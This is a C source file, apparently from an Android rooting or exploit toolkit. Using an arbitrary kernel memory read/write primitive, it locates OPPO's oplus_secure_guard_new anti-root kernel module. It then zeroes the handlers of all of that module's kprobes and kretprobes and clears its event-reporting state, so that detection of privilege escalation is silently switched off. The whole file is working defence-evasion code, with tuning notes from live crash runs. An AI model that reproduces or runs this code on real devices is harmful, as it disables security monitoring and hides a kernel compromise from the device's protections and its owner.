/*
 * secureguard.c — neutralize the OPPO oplus_secure_guard_new anti-root module
 *
 * REWRITTEN (run166+): the previous version scanned [text+0x3000, text+0x12000)
 * linearly for 4 hardcoded handler addresses. That died twice:
 *   1. run162/165 panics — the module's regions are SEPARATE module_alloc()
 *      vmalloc allocations (move_module allocates per mem[] type) with
 *      unmapped GUARD PAGES between them; a linear scan walks into a guard
 *      page -> configfs read of an unmapped page -> oops -> panic_on_oops.
 *   2. The handler "fixed offsets" (0x528/0x2040/...) came from an older .ko
 *      revision: current symtab has +0x1e0 deltas (oplus_report_execveat@0x348
 *      etc.) and the Ghidra numbers are a third revision (0x880 off).
 *
 * New design — no symbol offsets at all, everything structural:
 *   a) Walk the kernel modules list (kaslr_base+0x219d018) to find the
 *      `struct module` (name @ +0x18, list @ +0x08 — verified live run161-165).
 *   b) Read the struct module's mem[] array (anchor mod+0x1c0, empirically
 *      observed page-aligned mem[0].base there in run162/164/165; stride 0x48
 *      = base(8)+size(4)+pad(4)+mod_tree_node(0x38); validated at runtime and
 *      fallbacks {0x180,0x200,0x1a0} tried if the primary fails validation).
 *   c) Scan ONLY the MOD_DATA region (kprobe/kretprobe structs live in .data).
 *      Detect the 21 structs structurally:
 *        - kp.addr (+0x28) must point into the kernel image text span
 *          (all hooks target vmlinux symbols: __arm64_sys_set*uid/gid,
 *          do_execveat_common, futex, ppoll, ..., sel_write_load, cpuinfo).
 *        - symbol_name (+0x30) in {0} U module regions; offset (+0x38) == 0.
 *        - pre_handler (+0x40):
 *            * module text  -> plain kprobe: zero pre (+0x40) & post (+0x48)
 *            * kernel image -> kretprobe (pre_handler_kretprobe is installed
 *              by register_kretprobe): zero pre (kills return-address hijack
 *              entirely), plus handler (+0x80) and entry_handler (+0x88).
 *      All of these are NULL-checked by the kernel before call
 *      (arm64 kprobe_breakpoint_handler: !p->pre_handler || ...;
 *       __kretprobe_trampoline_handler: if (rp && rp->handler);
 *       pre_handler_kretprobe: if (rp->entry_handler && ...)) — verified
 *      against kernel-source/, so zeroing can never fault.
 *   d) Zero the report state in .bss (first section of the data region):
 *      keventupload_flag @ data+0x0, kevent_pid @ data+0x4,
 *      oplus_harden_init_succeed @ data+0x74 — gated on a content check
 *      (harden_init_succeed reads 1) so a .ko revision drift can't make us
 *      scribble on .data.
 */

#include "common.h"

/* Secureguard module (out-of-tree, /vendor_dlkm/lib/modules/) */
#define SECUREGUARD_MOD_NAME "oplus_secure_guard_new"

/* struct module offsets (6.6 android15, CONFIG_MODULES_TREE_LOOKUP=y):
 * state@0, list@0x08, name[56]@0x18 (kernel-source/include/linux/module.h,
 * verified live run161-165). */
#define MOD_LIST_OFF 0x08
#define MOD_NAME_OFF 0x18
#define MOD_NAME_LEN 56

/* The `modules` list head (kernel image .data) — verified against live
 * kallsyms: modules @ kaslr_base(_text)+0x219d018. */
#define MODULES_LIST_OFF 0x0219d018ULL

/* struct module mem[] (live BTF, /sys/kernel/btf/vmlinux pull 2026-08-17):
 *   struct module_memory { void *base; unsigned int size;
 *     struct mod_tree_node mtn; }  = 8+4+4+0x38 = 0x48 stride
 *   (latch_tree_node is 0x30 in the compiled kernel, not 0x38)
 *   mem[] is ____cacheline_aligned right after int (*init)(void) — BTF puts
 *   it at struct-module offset 0x1c0 (also empirically observed run162/164/165:
 *   page-aligned kernel ptr at mod+0x1c0 = mem[0].base). Sanity: 7×0x48 =
 *   0x1f8, and 0x1c0+0x1f8 = 0x3b8 = BTF offset of mod_arch_specific.arch. */
#define MOD_MEM_OFF_PRIMARY 0x1c0
static const uint64_t sg_mem_off_fallbacks[] = {0x180, 0x200, 0x1a0};
#define SG_N_MEM_FALLBACKS \
  (sizeof(sg_mem_off_fallbacks) / sizeof(sg_mem_off_fallbacks[0]))
#define MOD_MEM_STRIDE 0x48
#define MOD_MEM_NUM_TYPES 7
#define MOD_TEXT 0
#define MOD_DATA 1
#define MOD_RODATA 2
#define MOD_RO_AFTER_INIT 3

/* struct kprobe (arm64 6.6: hlist(16) list(16) nmissed(8) addr(8)@0x28
 * symbol_name(8)@0x30 offset(u32)@0x38 pre_handler(8)@0x40 post_handler(8)@0x48
 * opcode(4) ainsn(32) flags(4) -> size 0x80).
 * struct kretprobe = kp + handler@0x80, entry_handler@0x88 (size 0xB0 —
 * matches the .ko symtab: every *_kretprobe object is 176 bytes). */
#define KPROBE_ADDR_OFF 0x28
#define KPROBE_SYM_OFF 0x30
#define KPROBE_OFFSET_OFF 0x38
#define KPROBE_PRE_OFF 0x40
#define KPROBE_POST_OFF 0x48
#define KRETPROBE_HANDLER_OFF 0x80
#define KRETPROBE_ENTRY_OFF 0x88

/* Kernel image span for addr-field / kretprobe-pre classification.
 * vmlinux text+rodata+data ends below +0x2400000 (max symbol offset in
 * target.h is 0x236a0d8). */
#define SG_KIMAGE_SPAN 0x2400000ULL

/* .bss state offsets within the MOD_DATA region. The current .ko places
 * .bss (file 0x5f28, 0x75 bytes) as the FIRST section of the data region
 * (layout_sections places SHF_ALLOC|SHF_WRITE sections in section-index
 * order: .bss=21 before .data=22 before .exit.data=31 before
 * .gnu.linkonce.this_module=35). Symbol table (current .ko):
 *   oplus_security_keventupload_flag @ .bss+0x0
 *   kevent_pid                       @ .bss+0x4
 *   oplus_harden_init_succeed        @ .bss+0x74 */
#define SG_BSS_FLAG_OFF 0x00
#define SG_BSS_PID_OFF 0x04
#define SG_BSS_INIT_OK_OFF 0x74

/* configfs single-read maximum (~2700 bytes, empirically verified run165;
 * the 4096-0x55c=0xA9C≈2716 math in the handoff is an approximation).
 * MUST be divisible by 8: the scan probes 8-aligned structs from the chunk
 * base; a non-multiple-of-8 chunk size (2700 % 8 == 4) makes odd chunks
 * scan at +4 misalignment and silently MISS any kprobe/kretprobe struct
 * that lands there (audit 2026-08-18). 2696 = 0xA88 is 8-aligned and still
 * under the configfs cap. */
#define SG_CHUNK 2696

struct sg_regions {
  uint64_t text_base;
  uint32_t text_size;
  uint64_t data_base;
  uint32_t data_size;
  uint64_t rodata_base;
  uint32_t rodata_size;
  int valid;
};

/* Find the module struct address via the kernel modules list walk.
 * ColorOS masks /proc/modules AND /proc/kallsyms addresses even for root
 * (observed live: all zero), so this in-kernel walk is the only route.
 * The struct module lives in the module's own data region (vmalloc-class,
 * NOT slab) — configfs reads are safe there (verified run161-165). */
static uint64_t sg_find_module_struct(int fd, const char *name) {
  if (!kaslr_done) {
    return 0;
  }
  uintptr_t head = kaslr_base + MODULES_LIST_OFF;
  uintptr_t cur = kernel_read64(fd, head);
  if (!cur || !is_kernel_ptr(cur)) {
    pr_warning("sg: modules head.next=%016zx bad\n", (size_t)cur);
    fsync(STDERR_FILENO);
    return 0;
  }
  for (int i = 0; i < 512 && cur && cur != head; i++) {
    uintptr_t mod = cur - MOD_LIST_OFF;
    char modname[MOD_NAME_LEN + 1];
    memset(modname, 0, sizeof(modname));
    if (kernel_read_data(fd, mod + MOD_NAME_OFF, modname, MOD_NAME_LEN) ==
        (ssize_t)MOD_NAME_LEN) {
      if (strcmp(modname, name) == 0) {
        pr_info("sg: module %s struct @ %016zx\n", name, (size_t)mod);
        fsync(STDERR_FILENO);
        return mod;
      }
    }
    cur = kernel_read64(fd, cur);
    if (!cur || !is_kernel_ptr(cur)) {
      break;
    }
  }
  pr_warning("sg: module %s not found in module list\n", name);
  fsync(STDERR_FILENO);
  return 0;
}

/* Validate a raw mem[] readout: every non-NULL entry must be a page-aligned
 * kernel pointer with a page-multiple, sane size; MOD_TEXT and MOD_DATA must
 * both be present and non-zero. Init regions (4..6) are freed after load and
 * read as NULL. */
static int sg_mem_entries_valid(const uint64_t bases[MOD_MEM_NUM_TYPES],
                                const uint32_t sizes[MOD_MEM_NUM_TYPES]) {
  for (int i = 0; i < MOD_MEM_NUM_TYPES; i++) {
    if (bases[i] == 0 && sizes[i] == 0) {
      continue; /* freed init region — fine */
    }
    if (!is_kernel_ptr(bases[i]) || (bases[i] & 0xfff) != 0) {
      return 0;
    }
    if (sizes[i] < 0x1000 || sizes[i] > 0x1000000 || (sizes[i] & 0xfff) != 0) {
      return 0;
    }
  }
  if (!bases[MOD_TEXT] || !sizes[MOD_TEXT] || !bases[MOD_DATA] ||
      !sizes[MOD_DATA]) {
    return 0;
  }
  return 1;
}

/* Read the module's mem[] at a candidate offset; return 1 if it validates. */
static int sg_try_read_mem(int fd, uint64_t mod, uint64_t mem_off,
                           struct sg_regions *out) {
  uint64_t bases[MOD_MEM_NUM_TYPES];
  uint32_t sizes[MOD_MEM_NUM_TYPES];
  for (int i = 0; i < MOD_MEM_NUM_TYPES; i++) {
    bases[i] = kernel_read64(fd, mod + mem_off + (uint64_t)i * MOD_MEM_STRIDE);
    uint64_t sz =
        kernel_read64(fd, mod + mem_off + (uint64_t)i * MOD_MEM_STRIDE + 8);
    sizes[i] = (uint32_t)sz;
  }
  if (!sg_mem_entries_valid(bases, sizes)) {
    pr_warning("sg: mem[] @ off=0x%llx FAILED validation:\n",
               (unsigned long long)mem_off);
    for (int i = 0; i < MOD_MEM_NUM_TYPES; i++) {
      pr_warning("sg:   mem[%d] base=%016llx size=0x%x\n", i,
                 (unsigned long long)bases[i], sizes[i]);
    }
    fsync(STDERR_FILENO);
    return 0;
  }
  out->text_base = bases[MOD_TEXT];
  out->text_size = sizes[MOD_TEXT];
  out->data_base = bases[MOD_DATA];
  out->data_size = sizes[MOD_DATA];
  out->rodata_base = bases[MOD_RODATA];
  out->rodata_size = sizes[MOD_RODATA];
  out->valid = 1;
  return 1;
}

static int sg_ptr_in_region(uint64_t v, uint64_t base, uint32_t size) {
  return base != 0 && v >= base && v < base + size;
}

static int sg_ptr_in_module_regions(const struct sg_regions *r, uint64_t v) {
  if (v == 0) {
    return 0;
  }
  return sg_ptr_in_region(v, r->text_base, r->text_size) ||
         sg_ptr_in_region(v, r->data_base, r->data_size) ||
         sg_ptr_in_region(v, r->rodata_base, r->rodata_size);
}

static int sg_ptr_in_kimage(uint64_t v) {
  return kaslr_done && v >= kaslr_base && v < kaslr_base + SG_KIMAGE_SPAN;
}

/* GHOSTLOCK_SG_DRYRUN=1: detect + log everything but write NOTHING (used to
 * bisect whether the zeroing itself causes side effects). */
static int sg_dryrun(void) {
  char *d = getenv("GHOSTLOCK_SG_DRYRUN");
  return d && d[0] == '1';
}

/* Write a 64-bit zero via configfs, verify with a read-back, and log.
 * Returns 1 only when the write AND the read-back confirm the slot is now
 * zero (audit 2026-08-18: pwrite success alone does not prove the write
 * landed — the bin_buffer could have silently failed to retarget). */
static int sg_zero64(int fd, uint64_t addr, uint64_t was, const char *what) {
  if (sg_dryrun()) {
    pr_info("sg: [DRYRUN] would zero %-14s @ %016llx (was %016llx)\n", what,
            (unsigned long long)addr, (unsigned long long)was);
    fsync(STDERR_FILENO);
    return 0;
  }
  uint64_t zero = 0;
  if (kernel_write_data(fd, (uintptr_t)addr, &zero, sizeof(zero)) !=
      (ssize_t)sizeof(zero)) {
    pr_warning("sg: FAILED to zero %s @ %016llx\n", what,
               (unsigned long long)addr);
    fsync(STDERR_FILENO);
    return 0;
  }
  if (kernel_read64(fd, addr) != 0) {
    pr_warning("sg: zeroed %-20s @ %016llx (was %016llx) but read-back "
               "nonzero\n",
               what, (unsigned long long)addr, (unsigned long long)was);
    fsync(STDERR_FILENO);
    return 0;
  }
  pr_info("sg: zeroed %-20s @ %016llx (was %016llx)\n", what,
          (unsigned long long)addr, (unsigned long long)was);
  fsync(STDERR_FILENO);
  return 1;
}

/*
 * Scan the MOD_DATA region for the 21 kprobe/kretprobe structs and zero
 * their handlers. Returns number of handler pointers zeroed.
 */
static int sg_scan_and_zero_handlers(int fd, const struct sg_regions *r) {
  unsigned char buf[SG_CHUNK];
  int n_zeroed = 0;
  int n_kprobe = 0;
  int n_kretprobe = 0;

  pr_info("sg: scanning data region %016llx..%016llx (%u bytes)\n",
          (unsigned long long)r->data_base,
          (unsigned long long)(r->data_base + r->data_size), r->data_size);
  fsync(STDERR_FILENO);

  for (uint64_t chunk = r->data_base; chunk < r->data_base + r->data_size;
       chunk += SG_CHUNK) {
    /* CLAMP the last chunk to the region end — run167 panicked when the
     * final 2700-byte read ran 0x464 bytes past data+size into the
     * unmapped guard page. */
    size_t want = SG_CHUNK;
    uint64_t region_end = r->data_base + r->data_size;
    if (chunk + (uint64_t)want > region_end) {
      want = (size_t)(region_end - chunk);
    }
    ssize_t n = kernel_read_data(fd, (uintptr_t)chunk, buf, want);
    if (n <= 0) {
      pr_warning("sg: data chunk read @ %016llx failed n=%zd\n",
                 (unsigned long long)chunk, n);
      fsync(STDERR_FILENO);
      continue;
    }
    for (ssize_t off = 0; off + 0x90 <= n; off += 8) {
      uint64_t p = chunk + (uint64_t)off;
      uint64_t addr, sym, pre, post;
      uint32_t koff;
      memcpy(&addr, buf + off + KPROBE_ADDR_OFF, 8);
      memcpy(&sym, buf + off + KPROBE_SYM_OFF, 8);
      memcpy(&koff, buf + off + KPROBE_OFFSET_OFF, 4);
      memcpy(&pre, buf + off + KPROBE_PRE_OFF, 8);
      memcpy(&post, buf + off + KPROBE_POST_OFF, 8);

      /* kp.addr must point into the kernel image text span; the oplus
       * probes hook vmlinux symbols only (syscalls, do_execveat_common,
       * futex, ppoll, ..., sel_write_load, cpuinfo_open). */
      if (!sg_ptr_in_kimage(addr)) {
        continue;
      }
      /* symbol_name: NULL or a pointer into this module (func_name_*
       * strings live in .data). */
      if (sym != 0 && !sg_ptr_in_module_regions(r, sym)) {
        continue;
      }
      /* offset: registered on symbol entry → 0 */
      if (koff != 0) {
        continue;
      }

      if (sg_ptr_in_region(pre, r->text_base, r->text_size)) {
        /* Plain kprobe (8 × set*uid/set*gid syscalls): pre_handler is a
         * module function (handler_pre / oplus_root_check_pre_handler...).
         * NULL pre/post are skipped by the kernel handler — safe to zero. */
        if (pre != 0) {
          n_zeroed += sg_zero64(fd, p + KPROBE_PRE_OFF, pre, "kprobe.pre");
        }
        if (post != 0 && sg_ptr_in_module_regions(r, post)) {
          n_zeroed += sg_zero64(fd, p + KPROBE_POST_OFF, post, "kprobe.post");
        }
        n_kprobe++;
      } else if (sg_ptr_in_kimage(pre)) {
        /* Kretprobe: register_kretprobe overwrote kp.pre_handler with the
         * kernel's pre_handler_kretprobe (kernel image text). Zeroing it
         * stops the return-address hijack entirely — the trampoline never
         * engages, so handler/entry_handler are never called. They are also
         * NULL-checked in-kernel, so zero them too for belt and braces. */
        if (pre != 0) {
          n_zeroed += sg_zero64(fd, p + KPROBE_PRE_OFF, pre, "kretprobe.pre");
        }
        uint64_t handler, entry;
        memcpy(&handler, buf + off + KRETPROBE_HANDLER_OFF, 8);
        memcpy(&entry, buf + off + KRETPROBE_ENTRY_OFF, 8);
        if (handler != 0 && sg_ptr_in_module_regions(r, handler)) {
          n_zeroed +=
              sg_zero64(fd, p + KRETPROBE_HANDLER_OFF, handler,
                        "kretprobe.handler");
        }
        if (entry != 0 && sg_ptr_in_module_regions(r, entry)) {
          n_zeroed +=
              sg_zero64(fd, p + KRETPROBE_ENTRY_OFF, entry, "kretprobe.entry");
        }
        n_kretprobe++;
      } else {
        /* Not a registered kprobe/kretprobe per addr/pre. But the struct
         * may still be an UNREGISTERED kretprobe (registration failed at
         * init — e.g. capset/futex/ppoll/... — leaving addr=pre=0 with
         * handler/entry set statically). Zero those too so any late
         * (re-)registration is inert; handlers are NULL-checked in-kernel. */
        uint64_t handler, entry;
        memcpy(&handler, buf + off + KRETPROBE_HANDLER_OFF, 8);
        memcpy(&entry, buf + off + KRETPROBE_ENTRY_OFF, 8);
        if (pre == 0 &&
            (sg_ptr_in_region(handler, r->text_base, r->text_size) ||
             sg_ptr_in_region(entry, r->text_base, r->text_size))) {
          pr_info("sg: unregistered kretprobe @ %016llx addr=%016llx "
                  "handler=%016llx entry=%016llx\n",
                  (unsigned long long)p, (unsigned long long)addr,
                  (unsigned long long)handler, (unsigned long long)entry);
          fsync(STDERR_FILENO);
          if (handler != 0 && sg_ptr_in_region(handler, r->text_base,
                                                r->text_size)) {
            n_zeroed +=
                sg_zero64(fd, p + KRETPROBE_HANDLER_OFF, handler,
                          "kretprobe.handler");
          }
          if (entry != 0 &&
              sg_ptr_in_region(entry, r->text_base, r->text_size)) {
            n_zeroed +=
                sg_zero64(fd, p + KRETPROBE_ENTRY_OFF, entry,
                          "kretprobe.entry");
          }
          n_kretprobe++;
        }
      }
    }
  }
  if (n_zeroed == 0) {
    pr_warning("sg: found kprobes=%d kretprobes=%d, zeroed 0 — structural "
               "scan matched nothing (offset drift?)\n",
               n_kprobe, n_kretprobe);
  } else {
    pr_warning("sg: found kprobes=%d kretprobes=%d, zeroed %d handler pointers\n",
               n_kprobe, n_kretprobe, n_zeroed);
  }
  fsync(STDERR_FILENO);
  return n_zeroed;
}

/* Zero the .bss reporting state. Gated on a content check: the current .ko
 * guarantees harden_init_succeed == 1 at data+0x74 after module init — if
 * that doesn't read 1, the .ko on disk differs from ours and we skip rather
 * than scribble on .data. */
static void sg_zero_report_state(int fd, const struct sg_regions *r) {
  /* A/B gate for the swordfish-contract hypothesis (audit 2026-08-18):
   * the kevent reporting state (.bss flag/pid) may be load-bearing for the
   * ColorOS Athena/Swordfish launch pipeline — with
   * GHOSTLOCK_SG_KEEP_REPORT=1 we neutralize the handlers (no kill) but
   * KEEP the reporting state so the userspace security daemon still sees
   * events. Default (unset) keeps the proven run168+ behavior. */
  {
    char *keep = getenv("GHOSTLOCK_SG_KEEP_REPORT");
    if (keep && keep[0] == '1') {
      pr_info("sg: GHOSTLOCK_SG_KEEP_REPORT=1 — keeping kevent report "
              "state (handlers still zeroed)\n");
      fsync(STDERR_FILENO);
      return;
    }
  }
  uint64_t init_ok = kernel_read64(fd, r->data_base + SG_BSS_INIT_OK_OFF);
  pr_info("sg: harden_init_succeed @ %016llx reads 0x%016llx%s\n",
          (unsigned long long)(r->data_base + SG_BSS_INIT_OK_OFF),
          (unsigned long long)init_ok,
          (init_ok & 0xff) == 1 ? " (layout confirmed)" : "");
  fsync(STDERR_FILENO);
  if ((init_ok & 0xff) != 1) {
    pr_warning("sg: .bss layout check failed — skipping report-state zeroing "
               "(handlers already neutralized)\n");
    fsync(STDERR_FILENO);
    return;
  }
  if (sg_dryrun()) {
    pr_info("sg: [DRYRUN] would zero keventupload_flag/kevent_pid/"
            "harden_init_succeed in .bss\n");
    fsync(STDERR_FILENO);
    return;
  }
  uint32_t z32 = 0;
  if (kernel_write_data(fd, r->data_base + SG_BSS_FLAG_OFF, &z32, 4) == 4) {
    pr_info("sg: zeroed keventupload_flag @ %016llx\n",
            (unsigned long long)(r->data_base + SG_BSS_FLAG_OFF));
    fsync(STDERR_FILENO);
  }
  if (kernel_write_data(fd, r->data_base + SG_BSS_PID_OFF, &z32, 4) == 4) {
    pr_info("sg: zeroed kevent_pid @ %016llx\n",
            (unsigned long long)(r->data_base + SG_BSS_PID_OFF));
    fsync(STDERR_FILENO);
  }
  uint8_t z8 = 0;
  if (kernel_write_data(fd, r->data_base + SG_BSS_INIT_OK_OFF, &z8, 1) == 1) {
    pr_info("sg: zeroed harden_init_succeed @ %016llx\n",
            (unsigned long long)(r->data_base + SG_BSS_INIT_OK_OFF));
    fsync(STDERR_FILENO);
  }
}

int neutralize_secureguard(int fd) {
  /* 1. Locate the struct module via the in-kernel modules list walk.
   * (/proc/modules and /proc/kallsyms addresses are masked by ColorOS
   * even for root — verified live.) */
  uint64_t mod = sg_find_module_struct(fd, SECUREGUARD_MOD_NAME);
  if (!mod) {
    pr_warning("sg: module %s not found via module-list walk\n",
               SECUREGUARD_MOD_NAME);
    fsync(STDERR_FILENO);
    return 0;
  }

  /* 2. Read mem[] — try the empirical anchor first, then fallbacks. */
  struct sg_regions r;
  memset(&r, 0, sizeof(r));
  if (!sg_try_read_mem(fd, mod, MOD_MEM_OFF_PRIMARY, &r)) {
    int ok = 0;
    for (size_t i = 0; i < SG_N_MEM_FALLBACKS; i++) {
      if (sg_try_read_mem(fd, mod, sg_mem_off_fallbacks[i], &r)) {
        pr_warning("sg: mem[] at primary 0x%x failed validation; fallback "
                   "0x%llx matched\n",
                   (int)MOD_MEM_OFF_PRIMARY,
                   (unsigned long long)sg_mem_off_fallbacks[i]);
        fsync(STDERR_FILENO);
        ok = 1;
        break;
      }
    }
    if (!ok) {
      pr_warning("sg: mem[] readout failed at all candidate offsets — "
                 "cannot bound the scan safely, giving up\n");
      fsync(STDERR_FILENO);
      return 0;
    }
  }
  pr_info("sg: %s regions: text=%016llx/%x data=%016llx/%x "
          "rodata=%016llx/%x\n",
          SECUREGUARD_MOD_NAME, (unsigned long long)r.text_base,
          r.text_size, (unsigned long long)r.data_base, r.data_size,
          (unsigned long long)r.rodata_base, r.rodata_size);
  fsync(STDERR_FILENO);

  /* 3. Structurally detect and zero the kprobe/kretprobe handlers.
   * GHOSTLOCK_SG_KEEP_HANDLERS=1 is the inverse A/B mode: preserve every
   * hook and only test the separate .bss report-state writes. */
  int zeroed = 0;
  char *keep_handlers = getenv("GHOSTLOCK_SG_KEEP_HANDLERS");
  if (keep_handlers && keep_handlers[0] == '1') {
    pr_info("sg: GHOSTLOCK_SG_KEEP_HANDLERS=1 — preserving handler pointers\n");
    fsync(STDERR_FILENO);
  } else {
    zeroed = sg_scan_and_zero_handlers(fd, &r);
  }

  /* 4. Zero the netlink report state (.bss), content-gated. */
  sg_zero_report_state(fd, &r);

  return zeroed > 0;
}
